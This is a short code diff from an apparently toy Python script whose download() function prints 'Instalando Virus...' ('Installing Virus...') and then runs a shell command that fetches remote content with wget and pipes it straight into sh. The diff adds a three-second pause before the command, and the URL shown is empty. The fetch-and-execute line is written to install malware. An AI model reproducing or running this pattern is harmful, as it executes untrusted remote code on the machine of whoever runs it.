@@ -15,7 +15,8 @@ def clear():
 def download():
   clear()
   print("Instalando Virus...")
-	os.system("wget https:// -O- | sh")
+  time.sleep(3)	
+  os.system("wget https:// -O- | sh")
 
 # Run:
 
